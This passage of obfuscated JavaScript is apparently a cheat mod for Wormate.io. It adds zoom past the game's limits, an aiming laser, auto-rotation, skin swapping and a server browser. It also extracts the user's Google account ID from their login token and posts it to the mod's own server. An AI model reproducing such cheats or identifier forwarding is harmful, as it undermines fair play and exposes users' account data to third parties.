  window.respawnFn = function () {
    _0x3b6ea9.dh.Cn = 0;
    if (_0x3b6ea9.dh.mq) {
      _0x3b6ea9.dh.mq.close();
    }
    _0x3b6ea9.dh.mq = null;
    _0x3b6ea9.dh.Zp = function (_0x4bd8f6, _0x2ab6ab) {
      _wup.Zp(vps.con || _0x4bd8f6, _0x2ab6ab);
    };
    _0x3b6ea9.Pn();
  };
  $("<button id=\"op_wup\" class=\"op_wup\">⚙️ Settings</button>").insertAfter("#mm-store");
  $("#op_wup").click(function () {
    $("#modal_wup").css("display", "block");
    $("#modal_overlay_wup_fullscreen").css("display", "block");
    _0x4c56e8();
  });
  function _0x4c56e8() {
    try {
      const _0x52122c = localStorage.getItem("SaveGamewup");
      if (_0x52122c) {
        const _0x3bc593 = JSON.parse(_0x52122c);
        const _0x617a06 = document.getElementById("banned-words-toggle");
        if (_0x617a06) {
          _0x617a06.checked = _0x3bc593.bannedWordsEnabled || false;
        }
        const _0x2b3a50 = document.getElementById("laser");
        if (_0x2b3a50) {
          _0x2b3a50.checked = _0x3bc593.laserActive || false;
        }
        const _0x2ec6ef = document.getElementById("color");
        if (_0x2ec6ef && _0x3bc593.laserColor) {
          _0x2ec6ef.value = _0x3bc593.laserColor;
        }
        const _0x2e66bf = document.getElementById("range");
        const _0x42b880 = document.getElementById("range-value");
        if (_0x2e66bf && _0x3bc593.laserOpacity) {
          _0x2e66bf.value = _0x3bc593.laserOpacity;
          if (_0x42b880) {
            _0x42b880.textContent = _0x3bc593.laserOpacity;
          }
        }
      }
    } catch (_0x354d3f) {}
  }
  $(".store-view-cont").append("<div id=\"idReplaceSkin\"></div>");
  $(".wear-view-cont").append("<div id=\"idWearViewCont\"></div>");
  var _0x2b6183 = "display:none;position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background-color:transparent;color:white;border-radius:10px;width:890px;height:600px;padding:0px;z-index:99999;box-shadow:0 0 20px rgba(0,0,0,0.5);overflow:hidden;";
  if (_wup.ismobile) {
    _0x2b6183 = "display:none;position:relative;\n background-color:#1e2235;color:white;padding:20px;\n                  width:calc(100vw - var(--scrollbar-width));\n                  height:100vh;";
  }
  $("body").append("<div id=\"modal_overlay_wup_fullscreen\" style=\"display:none;position:fixed;top:0;left:0;width:100vw;height:100vh;background-color:rgba(0,0,0,0.5);z-index:9998;\" onclick=\"closeSetView()\"></div>");
  $("body").append("<div id=\"modal_wup\" class=\"modal\" style=\"" + _0x2b6183 + "\"></div>");
  window.gtr = {};
  var _0x415b17 = function _0x29461b(_0x49d5ef) {
    if (vps.shiftKey) {
      return;
    }
    var _0x2d7a77 = 30;
    var _0x5a672c = 0;
    var _0x5d00f2 = false;
    function _0x137997() {
      var _0x5784f6 = parseFloat(_0x3b6ea9.og.af.Bn);
      _0x5784f6 = (_0x5784f6 - 0.06) % (Math.PI * 2);
      if (_0x5784f6 < 0) {
        _0x5784f6 += Math.PI * 2;
      }
      _0x3b6ea9.og.af.Bn = _0x5784f6.toFixed(2);
    }
    function _0x1b820d(_0x1bf1ca) {
      _0x11c869 = setInterval(function () {
        if (_0x1bf1ca === 1) {
          _0x5a672c = _0x5d00f2 ? _0x5a672c - 1 : _0x5a672c + 1;
          if (_0x5a672c % 80 === 0 && !_0x5d00f2) {
            _0x2d7a77 = _0x2d7a77 + 18;
            clearInterval(_0x11c869);
            _0x1b820d(1);
          }
        }
        _0x137997();
      }, _0x2d7a77);
    }
    if ((_0x49d5ef == 7 || _0x49d5ef.key == "7") && _0x11c869 === null) {
      _0x3b6ea9.og.af.ng.Eb.removeEventListener("pointermove", gtr.onmovepoint, true);
      _0x1b820d(1);
      return;
    }
    if ((_0x49d5ef == 8 || _0x49d5ef.key == "8") && _0x11c869 === null) {
      _0x3b6ea9.og.af.ng.Eb.removeEventListener("pointermove", gtr.onmovepoint, true);
      _0x1b820d(2);
      return;
    }
    if (_0x11c869 !== null) {
      clearInterval(_0x11c869);
      _0x3b6ea9.og.af.ng.Eb.addEventListener("pointermove", gtr.onmovepoint, true);
      _0x11c869 = null;
    }
  };
  gtr.gtr_laser = false;
  gtr.gtrass1 = function () {
    var _0xdad66d = _0x5f32d0 ? 100 : 3;
    var _0x271dd9 = 1.2;
    var _0x83ec22 = _0x15b497 * _0x271dd9;
    if (_0x83ec22 <= _0xdad66d) {
      _0x15b497 = _0x83ec22;
    } else {
      _0x15b497 = _0xdad66d;
    }
  };
  gtr.gtrass2 = function () {
    var _0x94c4af = vps.configZoom?.limitDown || 0.25;
    var _0x15d136 = 1.2;
    var _0x5da399 = _0x15b497 / _0x15d136;
    if (_0x5da399 >= _0x94c4af) {
      _0x15b497 = _0x5da399;
    } else {
      _0x15b497 = _0x94c4af;
    }
  };
  gtr.gtrass3 = function () {
    if (gtr.gtr_rotate) {
      _0x415b17(8);
      $("#gtr_rotate").css("background-color", "#000");
    } else {
      _0x415b17(_0x11c869 ? 0 : 8);
    }
    if (_0x11c869) {
      gtr.gtr_snail = true;
      $("#gtr_snail").css("background-color", "#156ab3");
    } else {
      gtr.gtr_snail = false;
      $("#gtr_snail").css("background-color", "#000");
    }
    setTimeout(() => {
      var _0x94b16e = document.getElementById("gtr_snail");
      if (_0x94b16e) {
        var _0x4dd484 = _0x94b16e.querySelector("img");
        if (_0x4dd484) {
          if (gtr.gtr_snail === true) {
            _0x4dd484.src = atob(savedImages[3]);
            _0x94b16e.style.opacity = "1";
          } else {
            _0x4dd484.src = atob(savedImages[2]);
            _0x94b16e.style.opacity = "0.25";
          }
        }
      }
    }, 50);
  };
  gtr.gtrass4 = function () {
    if (gtr.gtr_snail) {
      $("#gtr_snail").css("background-color", "#000");
      _0x415b17(8);
    } else {
      _0x415b17(_0x11c869 ? 0 : 8);
    }
    if (_0x11c869) {
      gtr.gtr_rotate = true;
      $("#gtr_rotate").css("background-color", "#156ab3");
    } else {
      gtr.gtr_rotate = false;
      $("#gtr_rotate").css("background-color", "#000");
    }
    setTimeout(() => {
      var _0x164653 = document.getElementById("gtr_rotate");
      if (_0x164653) {
        var _0x3082d8 = _0x164653.querySelector("img");
        if (_0x3082d8) {
          if (gtr.gtr_rotate === true) {
            _0x3082d8.src = atob(savedImages[1]);
            _0x164653.style.opacity = "1";
          } else {
            _0x3082d8.src = atob(savedImages[0]);
            _0x164653.style.opacity = "0.25";
          }
        }
      }
    }, 50);
  };
  gtr.gtrass5 = function () {
    window.location.reload();
  };
  gtr.gtrass6 = function () {
    respawnFn();
  };
  gtr.gtrass7 = function () {
    _0x15b497 = 1;
  };
  gtr.gtrass9 = function (_0x2dbbd8) {
    var _0x5310a8 = _0x5f32d0 ? 100 : 2;
    if (_0x2dbbd8.value <= _0x5310a8) {
      _0x15b497 = _0x2dbbd8.value;
    }
  };
  gtr.gtr_skinr_origin = null;
  gtr.gtr_skinr_current = 0;
  gtr.gtr_skinr_seq = 0;
  gtr.gtr_skinr = function () {
    var _0x4aafee = Object.keys(vps.skinr || {});
    if (_0x4aafee.length === 0) {
      return;
    }
    if (gtr.gtr_skinr_origin === null) {
      gtr.gtr_skinr_origin = _wup._anApp.On.lj;
    }
    var _0x3a38fb = _0x4aafee.concat([String(gtr.gtr_skinr_origin)]);
    var _0x5be973 = [];
    for (var _0x23a24c = 0; _0x23a24c < _0x3a38fb.length; _0x23a24c++) {
      if (_0x5be973.indexOf(_0x3a38fb[_0x23a24c]) === -1) {
        _0x5be973.push(_0x3a38fb[_0x23a24c]);
      }
    }
    gtr.gtr_skinr_current = _0x5be973[gtr.gtr_skinr_seq % _0x5be973.length];
    gtr.gtr_skinr_seq++;
    _wup._anApp.dh.ch.Eh.Hh = gtr.gtr_skinr_current;
    try {
      if (_wup._anApp.dh.ch.Nm && _wup._anApp.dh.ch.Nm.yc) {
        _wup._anApp.dh.ch.Nm.yc(_wup._anApp.dh.hh.xg, _wup._anApp.Lc.Ub().jb(_wup._anApp.dh.ch.Eh.Gh), _wup._anApp.Lc.Ub().ib(gtr.gtr_skinr_current), _wup._anApp.Lc.Ub().kb(_wup._anApp.dh.ch.Eh.ni), _wup._anApp.Lc.Ub().lb(_wup._anApp.dh.ch.Eh.oi), _wup._anApp.Lc.Ub().mb(_wup._anApp.dh.ch.Eh.pi), _wup._anApp.Lc.Ub().nb(_wup._anApp.dh.ch.Eh.qi), "#ffffff");
      } else {
        _wup._anApp.dh.ch.Sm();
      }
    } catch (_0x12ebf1) {
      console.error("Error applying skin:", _0x12ebf1);
      _wup._anApp.dh.ch.Sm();
    }
  };
  gtr.reset_sequence = function () {
    gtr.gtr_skinr_seq = 0;
  };
  gtr.gtrass12 = function () {
    var _0x358072 = _wup._anApp.og.af.ng.mf.getChildByName("lineHS");
    if (_0x358072) {
      vps.laserActive = !vps.laserActive;
      if (vps.laserActive) {
        _0x358072.alpha = vps.laserOpacity || 0.3;
        gtr.gtr_laser = true;
      } else {
        _0x358072.alpha = 0;
        gtr.gtr_laser = false;
      }
    }
    gtr.updateLaserButton();
  };
  gtr.updateLaserButton = function () {
    var _0x44dcb8 = document.getElementById("gtr_laser");
    if (_0x44dcb8) {
      var _0x1c83b5 = _0x44dcb8.querySelector("img");
      if (_0x1c83b5) {
        if (gtr.gtr_laser === true) {
          _0x1c83b5.src = atob(savedImages[86]);
          _0x44dcb8.style.opacity = "1";
          _0x44dcb8.classList.add("active");
        } else {
          _0x1c83b5.src = atob(savedImages[85]);
          _0x44dcb8.style.opacity = "0.25";
          _0x44dcb8.classList.remove("active");
        }
      }
    }
  };
  gtr.switchJoystickType = function () {
    switch (vps.joystickType) {
      case 1:
        vps.joystickType = 6;
        break;
      case 6:
        vps.joystickType = 4;
        break;
      case 4:
        vps.joystickType = 5;
        break;
      case 5:
        vps.joystickType = 2;
        break;
      case 2:
        vps.joystickType = 3;
        break;
      case 3:
        vps.joystickType = 1;
        break;
      default:
        vps.joystickType = 1;
    }
    localStorage.setItem("SaveGamewup", JSON.stringify(vps));
    gtr.updateJoystickSwitchButton();
    gtr.clearAllJoystickElements();
    if (_wup.ismobile) {
      setTimeout(() => {
        _0x30284c();
      }, 100);
    }
  };
  gtr.clearAllJoystickElements = function () {
    if (_0x4c5834) {
      _0x4c5834.destroy();
      _0x4c5834 = null;
    }
    _0x589218();
    const _0x3e0d23 = ["img_1", "img_2", "img_3", "img_4", "img_o_2", "img_o_3", "img_o_4", "img_i_2", "img_i_3", "img_p_1", "img_p_2", "img_p_3", "img_p_4", "img_p_5", "img_f", "img_pf_1"];
    _0x3e0d23.forEach(_0xb03ae8 => {
      const _0x1ffbe5 = document.getElementById(_0xb03ae8);
      if (_0x1ffbe5 && _0x1ffbe5.parentNode) {
        _0x1ffbe5.parentNode.removeChild(_0x1ffbe5);
      }
    });
  };
  if (vps.activeZoom) {
    window.addEventListener("wheel", function (_0x31c9be) {
      var _0x560ed0 = _0x5f32d0 ? 100 : 3;
      var _0x5145a5 = vps.configZoom?.limitDown || 0.25;
      var _0x53cb6e = _0x31c9be.deltaY < 0;
      var _0x2d6dbd;
      var _0x5cff1c;
      if (_0x15b497 > 10) {
        _0x2d6dbd = 1.08;
        _0x5cff1c = 1.12;
      } else {
        _0x2d6dbd = 1.15;
        _0x5cff1c = 1.2;
      }
      var _0x6a5a29;
      if (_0x53cb6e) {
        _0x6a5a29 = _0x15b497 * _0x2d6dbd;
      } else {
        _0x6a5a29 = _0x15b497 / _0x5cff1c;
      }
      if (_0x6a5a29 >= _0x5145a5 && _0x6a5a29 <= _0x560ed0) {
        _0x15b497 = _0x6a5a29;
      } else {
        if (_0x6a5a29 < _0x5145a5) {
          _0x15b497 = _0x5145a5;
        }
        if (_0x6a5a29 > _0x560ed0) {
          _0x15b497 = _0x560ed0;
        }
      }
    }, {
      passive: false
    });
  }
  $("#mm-advice-cont").html("<div class=\"div_FullScreen\">\n    <input type=\"button\" value=\"RESPAWN\" id=\"btnRePlay\" onclick=\"respawnFn()\" />\n    <input type=\"button\" value=\"FullScreen\" id=\"btnFullScreen\" />\n    \n    </div>");
  var _0x576c6d = $("#idReplaceSkin");
  var _0x49b7fd = function () {
    var _0x5691bb = _0x8f1d97(_0x22e5a4().mark(function _0x513ccb(_0x1dddf4, _0x494e61) {
      return _0x22e5a4().wrap(function _0x3de7e1(_0x22443c) {
        while (1) {
          switch (_0x22443c.prev = _0x22443c.next) {
            case 0:
              if (!_0x494e61) {
                _0x22443c.next = 2;
                break;
              }
              return _0x22443c.abrupt("return");
            case 2:
              if (!_0x1dddf4) {
                _0x1dddf4 = _0x3b6ea9.u.wi;
              }
              vps.userId = _0x1dddf4.userId;
              _0x22443c.next = 7;
              if (_0x1dddf4.type === "error") {
                $(".description-text").html(_0x1dddf4.msg);
              } else {
                window.currentDisplayMode = "timmap";
                if (typeof window.servers === "undefined") {
                  window.servers = {
                    Api_listServer: []
                  };
                }
                function _0x475a59() {
                  try {
                    const _0x206d71 = localStorage.getItem("cachedServers");
                    if (_0x206d71) {
                      const _0x276317 = JSON.parse(_0x206d71);
                      const _0x1df5ba = _0x276317.timestamp;
                      const _0x309326 = new Date().getTime();
                      if (_0x309326 - _0x1df5ba < 3600000) {
                        window.servers = _0x276317.data;
                        return true;
                      }
                    }
                  } catch (_0x3e5062) {
                    console.error("خطأ في تحميل البيانات المحفوظة:", _0x3e5062);
                  }
                  return false;
                }
                async function _0x32452e() {
                  try {
                    const _0x574657 = await fetch(window.vps.s_l + "/servers");
                    if (_0x574657.ok) {
                      const _0x19b52e = await _0x574657.json();
                      if (_0x19b52e.success && Array.isArray(_0x19b52e.servers)) {
                        window.servers.Api_listServer = _0x19b52e.servers.filter(_0x5d1078 => _0x5d1078.serverUrl);
                        try {
                          const _0x430d89 = {
                            timestamp: new Date().getTime(),
                            data: window.servers
                          };
                          localStorage.setItem("cachedServers", JSON.stringify(_0x430d89));
                        } catch (_0x3ee4b3) {
                          console.warn("فشل في حفظ البيانات:", _0x3ee4b3);
                        }
                        return true;
                      }
                    }
                  } catch (_0x54a116) {
                    console.error("خطأ في تحميل السيرفرات:", _0x54a116);
                  }
                  return false;
                }
                function _0x2000ad() {
                  return "\n                <div class=\"title-wormate-server\">S E R V E R S</div>\n                <div class=\"description-text-hiep\">\n                    <div style=\"position:sticky; top:0; z-index:100; background:#242424;\">\n                        <br>\n                        <ul style=\"margin-top:5px\" class=\"ui-tabs-nav\">\n                           <li class=\"ui-tabs-tab ui-tab ui-tab-inactive0 ui-tab-active\" style=\"margin:-5px\">\n                               <a><span class=\"flag br\" value=\"" + atob(savedImages[70]) + "\"></span></a>\n                           </li>\n                           <li class=\"ui-tabs-tab ui-tab ui-tab-inactive1\" style=\"margin:-5px\">\n                               <a><span class=\"flag mx\" value=\"" + atob(savedImages[71]) + "\"></span></a>\n                           </li>\n                           <li class=\"ui-tabs-tab ui-tab ui-tab-inactive2\" style=\"margin:-5px\">\n                               <a><span class=\"flag us\" value=\"" + atob(savedImages[72]) + "\"></span></a>\n                           </li>\n                           <li class=\"ui-tabs-tab ui-tab ui-tab-inactive3\" style=\"margin:-5px\">\n                               <a><span class=\"flag ca\" value=\"" + atob(savedImages[73]) + "\"></span></a>\n                           </li>\n                           <li class=\"ui-tabs-tab ui-tab ui-tab-inactive4\" style=\"margin:-5px\">\n                               <a><span class=\"flag de\" value=\"" + atob(savedImages[74]) + "\"></span></a>\n                           </li>\n                           <li class=\"ui-tabs-tab ui-tab ui-tab-inactive5\" style=\"margin:-5px\">\n                               <a><span class=\"flag fr\" value=\"" + atob(savedImages[75]) + "\"></span></a>\n                           </li>\n                           <li class=\"ui-tabs-tab ui-tab ui-tab-inactive6\" style=\"margin:-5px\">\n                               <a><span class=\"flag sg\" value=\"" + atob(savedImages[76]) + "\"></span></a>\n                           </li>\n                           <li class=\"ui-tabs-tab ui-tab ui-tab-inactive7\" style=\"margin:-5px\">\n                               <a><span class=\"flag jp\" value=\"" + atob(savedImages[77]) + "\"></span></a>\n                           </li>\n                           <li class=\"ui-tabs-tab ui-tab ui-tab-inactive8\" style=\"margin:-5px\">\n                               <a><span class=\"flag au\" value=\"" + atob(savedImages[78]) + "\"></span></a>\n                           </li>\n                           <li class=\"ui-tabs-tab ui-tab ui-tab-inactive9\" style=\"margin:-5px\">\n                               <a><span class=\"flag gb\" value=\"" + atob(savedImages[79]) + "\"></span></a>\n                           </li>\n                        </ul>\n                        \n                        <div style=\"text-align: center; margin: 2px 0; padding: 2px;\">\n                            <button id=\"sort-toggle\" style=\"font-size: 10px; padding: 1px 6px; background-color: #333; color: #ddd; border: 1px solid #666; border-radius: 3px; cursor: pointer; outline: none;\">Timmap Servers</button>\n                        </div>\n                        \n                        <div class=\"gachngang\"></div>\n                        <div class=\"server-header\">\n                            <div class=\"header-name\">SERVER</div>\n                            <div class=\"header-region\">REGION</div>\n                            <div class=\"header-status\">STATUS</div>\n                            <div class=\"header-score\">SCORE</div>\n                        </div>\n                        <div class=\"gachngang\"></div>\n                    </div>\n                    \n                    <div class=\"background-image-container\">\n                        <img src=\"" + window.vps.s_l + "/images/Background/serverbg.jpg\" class=\"background-image\">\n                    </div>\n                    \n                    <div class=\"servers-container\">\n                        <div class=\"servers-de\"></div>\n                        <div class=\"servers-uae\" style=\"display:none\"></div>\n                        <div class=\"servers-us\" style=\"display:none\"></div>\n                        <div class=\"servers-ca\" style=\"display:none\"></div>\n                        <div class=\"servers-br\" style=\"display:none\"></div>\n                        <div class=\"servers-fr\" style=\"display:none\"></div>\n                        <div class=\"servers-sg\" style=\"display:none\"></div>\n                        <div class=\"servers-jp\" style=\"display:none\"></div>\n                        <div class=\"servers-gb\" style=\"display:none\"></div>\n                        <div class=\"servers-au\" style=\"display:none\"></div>\n                    </div>\n                </div>\n            ";
                }
                const _0x2d0e14 = {
                  br: atob(savedImages[70]),
                  mx: atob(savedImages[71]),
                  us: atob(savedImages[72]),
                  ca: atob(savedImages[73]),
                  de: atob(savedImages[74]),
                  fr: atob(savedImages[75]),
                  sg: atob(savedImages[76]),
                  jp: atob(savedImages[77]),
                  au: atob(savedImages[78]),
                  gb: atob(savedImages[79]),
                  default: atob(savedImages[80])
                };
                function _0x37deaf(_0x12c2c9) {
                  const _0x564202 = {
                    br: "br",
                    us: "us",
                    au: "gb",
                    ca: "ca",
                    jp: "jp",
                    gb: "au",
                    sg: "sg",
                    fr: "fr",
                    uae: "mx",
                    default: "de"
                  };
                  const _0x54da82 = _0x564202[_0x12c2c9] || _0x564202.default;
                  return _0x2d0e14[_0x54da82] || _0x2d0e14.default;
                }
                function _0x1b12af() {
                  if (!window.servers || !window.servers.Api_listServer || window.servers.Api_listServer.length === 0) {
                    return;
                  }
                  const _0x415eb5 = {
                    de: {
                      code: "DE",
                      container: "servers-de"
                    },
                    uae: {
                      code: "UAE",
                      container: "servers-uae"
                    },
                    us: {
                      code: "US",
                      container: "servers-us"
                    },
                    ca: {
                      code: "LT",
                      container: "servers-ca"
                    },
                    br: {
                      code: "BR",
                      container: "servers-br"
                    },
                    fr: {
                      code: "FR",
                      container: "servers-fr"
                    },
                    sg: {
                      code: "SG",
                      container: "servers-sg"
                    },
                    jp: {
                      code: "JP",
                      container: "servers-jp"
                    },
                    gb: {
                      code: "IN",
                      container: "servers-gb"
                    },
                    au: {
                      code: "UK",
                      container: "servers-au"
                    }
                  };
                  Object.values(_0x415eb5).forEach(_0x870a55 => {
                    $("." + _0x870a55.container).empty();
                  });
                  let _0x5c615c = window.currentDisplayMode || "timmap";
                  const _0x9b8c72 = {};
                  Object.keys(_0x415eb5).forEach(_0x56efae => {
                    _0x9b8c72[_0x56efae] = [];
                  });
                  window.servers.Api_listServer.forEach(_0x57e18f => {
                    let _0x21fef1 = null;
                    if (_0x5c615c === "timmap" && _0x57e18f.timmap) {
                      _0x21fef1 = _0x57e18f.timmap;
                    } else if (_0x5c615c === "wormworld" && _0x57e18f.wormworld) {
                      _0x21fef1 = _0x57e18f.wormworld;
                    }
                    if (_0x21fef1 && _0x9b8c72[_0x57e18f.region]) {
                      _0x57e18f.displayNumber = _0x21fef1;
                      _0x9b8c72[_0x57e18f.region].push(_0x57e18f);
                    }
                  });
                  Object.keys(_0x9b8c72).forEach(_0x20d7d3 => {
                    const _0x1b8d46 = _0x9b8c72[_0x20d7d3];
                    const _0x13488a = _0x415eb5[_0x20d7d3];
                    if (_0x1b8d46.length > 0) {
                      _0x1b8d46.sort((_0x300d88, _0x1ae637) => (_0x300d88.displayNumber || 0) - (_0x1ae637.displayNumber || 0));
                      _0x1b8d46.forEach(_0x144bb6 => {
                        const _0x4bacd5 = _0x144bb6.displayNumber;
                        const _0x39ee79 = _0x144bb6.name || "WW";
                        const _0x16cf22 = _0x144bb6.image || atob(savedImages[80]);
                        const _0x4c9a6e = _0x13488a.code + " " + _0x4bacd5;
                        const _0x2a90e2 = "" + _0x4bacd5 + _0x20d7d3.substring(0, 2);
                        const _0x512a3e = "\n                            <div class=\"selectSala\" \n                                 id=\"" + _0x20d7d3 + "\" \n                                 value=\"" + _0x144bb6.serverUrl + "\" \n                                 data-server-name=\"" + _0x39ee79 + "\" \n                                 data-region-name=\"" + _0x13488a.code + "\" \n                                 data-region-flag=\"" + _0x37deaf(_0x20d7d3) + "\"\n                                 data-server-number=\"" + _0x4bacd5 + "\" \n                                 data-server-image=\"" + _0x16cf22 + "\"\n                                 data-con=\"" + _0x144bb6.serverUrl + "\" \n                                 data-room=\"" + _0x4c9a6e + "\"\n                                 data-type=\"false\">\n                                <div class=\"server-image\">\n                                    <img src=\"" + _0x16cf22 + "\" alt=\"" + _0x39ee79 + "\">\n                                </div>\n                                <div class=\"server-info\">\n                                    <span class=\"server-number\" style=\"color: " + (_0x5c615c === "wormworld" ? "#00a8ff" : "#f00") + "\">" + _0x4bacd5 + ".</span>\n                                    <span class=\"server-name\">" + _0x39ee79 + "</span>\n                                </div>\n                                <div class=\"server-region\">" + _0x4c9a6e + "</div>\n                                <div class=\"server-status\">\n                                    <span class=\"green-dot\"></span>\n                                </div>\n                                <div class=\"server-score\">-</div>\n                            </div>\n                        ";
                        $("." + _0x13488a.container).append(_0x512a3e);
                        $("." + _0x13488a.container + " .selectSala:last").addClass("selecionar-sala-v2");
                        $("." + _0x13488a.container + " .selectSala:last").addClass("dropdown-item");
                        $("." + _0x13488a.container + " .selectSala:last").css("cursor", "pointer");
                      });
                    } else {
                      $("." + _0x13488a.container).append("\n                        <div style=\"text-align:center; padding:20px; color:#aaa;\">\n                            No servers available in this region\n                        </div>\n                    ");
                    }
                  });
                  if (typeof _wup.load_con === "function") {
                    _wup.load_con();
                  }
                  setTimeout(_0x5618b0, 1000);
                }
                function _0x5618b0() {
                  fetch(window.vps.s_l + "/wormate-api.php?t=" + Date.now()).then(_0x4bf1f3 => _0x4bf1f3.json()).then(_0x2c6b44 => {
                    if (_0x2c6b44 && Array.isArray(_0x2c6b44)) {
                      $(".selectSala").each(function () {
                        const _0xcf459f = $(this);
                        const _0x112bbb = _0xcf459f.attr("value");
                        const _0x1298a1 = _0x2c6b44.find(_0x405427 => _0x405427.serverUrl === _0x112bbb);
                        if (_0x1298a1 && _0x1298a1.players && _0x1298a1.players.length > 0) {
                          const _0x2fc189 = _0x1298a1.players[0];
                          const _0x1f4b4a = _0xe1663e(_0x2fc189.score);
                          const _0x394dcd = _0x2fc189.score >= 1000000;
                          _0xcf459f.find(".server-score").html("<span class=\"score-display " + (_0x394dcd ? "million" : "regular") + "\">" + _0x1f4b4a + "</span>");
                          const _0x30403c = _0x1298a1.players.filter(_0x2da34b => _0x2da34b.score >= 1000000).length;
                          if (_0x30403c >= 4) {
                            _0xcf459f.find(".green-dot").css("display", "block");
                          }
                          _0xcf459f.data("players", JSON.stringify(_0x1298a1.players));
                        } else {
                          _0xcf459f.find(".server-score").html("-");
                          _0xcf459f.find(".green-dot").css("display", "none");
                        }
                      });
                    }
                  }).catch(_0xfa61f3 => console.error("خطأ في جلب بيانات السيرفرات:", _0xfa61f3));
                }
                function _0xe1663e(_0x3db0f4) {
                  if (_0x3db0f4 >= 1000000) {
                    return (_0x3db0f4 / 1000000).toFixed(2) + "M";
                  } else if (_0x3db0f4 >= 1000) {
                    return (_0x3db0f4 / 1000).toFixed(1) + "K";
                  } else {
                    return _0x3db0f4.toFixed(0);
                  }
                }
                function _0x502e2f() {
                  const _0x42c91b = {
                    mx: "servers-uae",
                    br: "servers-de",
                    us: "servers-us",
                    ca: "servers-ca",
                    de: "servers-br",
                    fr: "servers-fr",
                    sg: "servers-sg",
                    jp: "servers-jp",
                    au: "servers-gb",
                    gb: "servers-au"
                  };
                  $(".flag").off("click");
                  Object.keys(_0x42c91b).forEach((_0x3c6bfd, _0x24422c) => {
                    $(".flag." + _0x3c6bfd).on("click", function (_0x578ee6) {
                      _0x578ee6.preventDefault();
                      _0x578ee6.stopPropagation();
                      $(".ui-tabs-nav .ui-tab").removeClass("ui-tab-active");
                      $(this).closest(".ui-tab").addClass("ui-tab-active");
                      $(".servers-de, .servers-uae, .servers-us, .servers-ca, .servers-br, .servers-fr, .servers-sg, .servers-jp, .servers-gb, .servers-au").hide();
                      $("." + _0x42c91b[_0x3c6bfd]).fadeIn(300);
                      let _0x965dcb = $(this).attr("value");
                      if (typeof window.theoKzObjects !== "undefined") {
                        window.theoKzObjects.flag = _0x965dcb;
                      }
                    });
                  });
                }
                function _0x5a0647() {
                  $("body").append("<div id=\"custom-tooltip\" style=\"display: none; position: absolute; z-index: 9999; background: rgba(0,0,0,0.9); padding: 5px 10px; border-radius: 4px; font-size: 10px; pointer-events: none; text-align: center;\"><div style=\"display: flex; justify-content: space-between; align-items: center;\"><span style=\"color: #ffd700; text-align: right;\">TimMap Servers </span><span style=\"color: white; margin: 0 5px;\">⟷ </span><span style=\"color: #ffd700; text-align: left;\">WormWorld Servers</span></div></div>");
                  $("#sort-toggle").off("click mouseenter mouseleave");
                  $("#sort-toggle").on({
                    mouseenter: function (_0x19c02e) {
                      var _0x33ceaf = $("#custom-tooltip");
                      var _0x42dd68 = $(this).offset();
                      var _0x1ca344 = $(this).outerWidth();
                      var _0x824ebd = _0x33ceaf.outerWidth();
                      _0x33ceaf.css({
                        left: _0x42dd68.left + _0x1ca344 / 2 - _0x824ebd / 2,
                        top: _0x42dd68.top + 30
                      }).fadeIn(200);
                    },
                    mouseleave: function () {
                      $("#custom-tooltip").fadeOut(200);
                    }
                  });
                  $("#sort-toggle").click(function () {
                    if (window.currentDisplayMode === "timmap") {
                      window.currentDisplayMode = "wormworld";
                      $(this).addClass("wormworld").text("WormWorld Servers");
                    } else {
                      window.currentDisplayMode = "timmap";
                      $(this).removeClass("wormworld").text("Timmap Servers");
                    }
                    _0x1b12af();
                  });
                }
                async function _0x3ade65() {
                  $(".description-text").html(_0x2000ad());
                  const _0x2cc2b3 = _0x475a59();
                  if (_0x2cc2b3) {
                    _0x1b12af();
                    _0x502e2f();
                    _0x5a0647();
                  }
                  const _0x26a4a4 = await _0x32452e();
                  if (_0x26a4a4 && !_0x2cc2b3) {
                    _0x1b12af();
                    _0x502e2f();
                    _0x5a0647();
                  } else if (_0x26a4a4 && _0x2cc2b3) {
                    _0x1b12af();
                  }
                  if (!_0x2cc2b3 && !_0x26a4a4) {
                    $(".description-text").html("🎮 Failed to load servers. Please try again later.");
                  }
                  setInterval(() => {
                    _0x32452e().then(_0x57abf9 => {
                      if (_0x57abf9) {
                        _0x1b12af();
                      }
                    });
                  }, 300000);
                }
                _0x3ade65();
              }
              function _0x2f191b(_0x1a994e) {
                try {
                  if (_0x1a994e && _0x1a994e.startsWith("gg_")) {
                    const _0x26dd7b = _0x1a994e.replace("gg_", "");
                    const _0x14e021 = JSON.parse(atob(_0x26dd7b.split(".")[1]));
                    return "gg_" + _0x14e021.sub;
                  }
                  if (_0x1a994e && _0x1a994e.startsWith("fb_")) {
                    return _0x1a994e;
                  }
                  return _0x1a994e;
                } catch (_0x10b8d9) {
                  return "غير متوفر";
                }
              }
              window.copyUserIdToClipboard = function () {
                const _0x421444 = _0x2f191b(vps.wuid || window.wup_keycode);
                navigator.clipboard.writeText(_0x421444).then(function () {
                  alert("Your ID " + _0x421444 + " copied!");
                }).catch(function () {
                  const _0x45f3ff = document.createElement("textarea");
                  _0x45f3ff.value = _0x421444;
                  document.body.appendChild(_0x45f3ff);
                  _0x45f3ff.select();
                  document.execCommand("copy");
                  document.body.removeChild(_0x45f3ff);
                  alert("Your ID " + _0x421444 + " copied!");
                });
              };
              const _0x41e5b2 = _0x2f191b(vps.wuid || window.wup_keycode);
              $(".profile-user").append("<div class=\"idwormate\" style=\"margin-left: 20px; margin-top: -35px;\"><input type=\"text\" value=\"" + _0x41e5b2 + "\" style=\"max-width: 300px; width: 350px !important; height: 22px !important; border-radius: 6px; font-size: 14px; text-align: center; background-color: #fff; color: #0a6928; font-weight: 630; display: inline-block; margin-right: 10px;\" readonly/><button id=\"btn_copy_user_id\" style=\"width: 100px; height: 35px; border-radius: 6px; font-size: 15px; background-color: #4CAF50; color: white; border: none; cursor: pointer;\">Copy</button></div>");
              $("#btn_copy_user_id").click(function () {
                window.copyUserIdToClipboard();
              });
              function _0x1fecdb(_0xee36a5) {
                try {
                  if (_0xee36a5 && _0xee36a5.startsWith("gg_")) {
                    const _0x4d884e = _0xee36a5.replace("gg_", "");
                    const _0x5225e5 = JSON.parse(atob(_0x4d884e.split(".")[1]));
                    return "gg_" + _0x5225e5.sub;
                  }
                  return _0xee36a5;
                } catch (_0xaf81a6) {
                  return _0xee36a5;
                }
              }
              const _0x16fbc1 = _0x1fecdb(vps.wuid || window.wup_keycode);
              return fetch(window.vps.s_l + "/extension", {
                headers: {
                  "Content-Type": "application/json",
                  "x-wuid": _0x16fbc1,
                  "x-uid": _0x16fbc1
                },
                method: "POST",
                body: JSON.stringify({
                  userId: _0x16fbc1
